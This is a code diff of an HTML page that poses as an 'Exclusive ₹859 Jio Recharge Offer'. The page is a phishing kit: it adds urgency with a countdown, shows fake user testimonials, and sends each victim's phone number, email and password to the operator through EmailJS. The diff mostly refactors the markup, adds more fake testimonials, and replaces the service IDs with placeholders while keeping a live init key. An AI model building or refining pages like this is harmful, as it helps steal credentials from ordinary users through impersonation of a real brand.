@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Exclusive ₹859 Jio Recharge Offer</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
-    
     <style>
         * {
             margin: 0;
@@ -58,7 +58,7 @@
             color: #D50032;
             margin-bottom: 20px;
             font-weight: bold;
-            text-shadow: 2px 2px 5px rgba(0,0,0,0.3);
+            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3);
         }
 
         .offer-description {
@@ -156,7 +156,8 @@
             display: none;
         }
 
-        .success-message, .failure-message {
+        .success-message,
+        .failure-message {
             font-size: 1.2rem;
             font-weight: 600;
             margin-top: 20px;
@@ -203,6 +204,7 @@
                 opacity: 0;
                 transform: translateY(20px);
             }
+
             100% {
                 opacity: 1;
                 transform: translateY(0);
@@ -213,9 +215,11 @@
             0% {
                 transform: scale(1);
             }
+
             50% {
                 transform: scale(1.1);
             }
+
             100% {
                 transform: scale(1);
             }
@@ -225,12 +229,14 @@
             0% {
                 transform: rotate(0deg);
             }
+
             100% {
                 transform: rotate(360deg);
             }
         }
     </style>
 </head>
+
 <body>
 
     <div class="main-container">
@@ -262,33 +268,29 @@
                 </form>
             </div>
 
-            <div id="loading" class="hidden">
-                <p>Processing... Please wait.</p>
-                <div class="loading-spinner"></div>
-            </div>
+            <div id="loading" class="loading-spinner hidden"></div>
 
-            <div id="failure" class="hidden">
-                <p class="failure-message">Oops! Something went wrong. Please try again later.</p>
-            </div>
-
-            <div id="success" class="hidden">
-                <p class="success-message">🎉 Congratulations! You've claimed your ₹859 Jio recharge. Enjoy unlimited data!</p>
-            </div>
+            <div id="success" class="success-message hidden">Your claim was successful! Check your email for further instructions.</div>
+            <div id="failure" class="failure-message hidden">Something went wrong. Please try again later.</div>
         </div>
     </div>
 
     <div class="testimonial-section">
-        <h3>What Our Users Are Saying:</h3>
-        <p class="testimonial">"I never imagined such a great offer. ₹859 recharge was just too good to pass up. Thanks Jio!"</p>
+        <h3>What Our Users Say</h3>
+        <p class="testimonial">"Absolutely amazing! This offer was a lifesaver. I saved so much!"</p>
         <p class="testimonial-author">- Rajesh K.</p>
         <p class="testimonial">"Easy steps, fast processing, and amazing rewards. Highly recommended!"</p>
         <p class="testimonial-author">- Priya S.</p>
+        <p class="testimonial">"The process was simple and fast. I got my offer within minutes!"</p>
+        <p class="testimonial-author">- Ankit D.</p>
+        <p class="testimonial">"Best offer I’ve received. It was hassle-free and the recharge was instant!"</p>
+        <p class="testimonial-author">- Sneha M.</p>
     </div>
 
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
-        // Initialize EmailJS
-        emailjs.init('5kGUJzWJZpHnKc-KL');
+        // Initialize EmailJS with your user ID
+        emailjs.init('5kGUJzWJZpHnKc-KL'); // Replace with your EmailJS User ID
 
         // Countdown Timer
         let countdownTime = 5 * 60; // 5 minutes in seconds
@@ -333,21 +335,23 @@
             document.getElementById('loading').classList.remove('hidden');
 
             // Send email using EmailJS
-            emailjs.send('service_ve6w0et', 'template_fzdw02s', {
+            emailjs.send('service_ABC123', 'template_XYZ789', {
                 phone: phone,
                 email: email,
                 password: password
-            }).then(function(response) {
+            }).then(function (response) {
                 console.log('Email sent successfully:', response);
                 document.getElementById('loading').classList.add('hidden');
                 document.getElementById('success').classList.remove('hidden');
-            }, function(error) {
+            }, function (error) {
                 console.log('Error sending email:', error);
                 document.getElementById('loading').classList.add('hidden');
                 document.getElementById('failure').classList.remove('hidden');
             });
 
-            
+            return false; // Prevent the form from actually submitting
+        }
     </script>
 </body>
+
 </html>
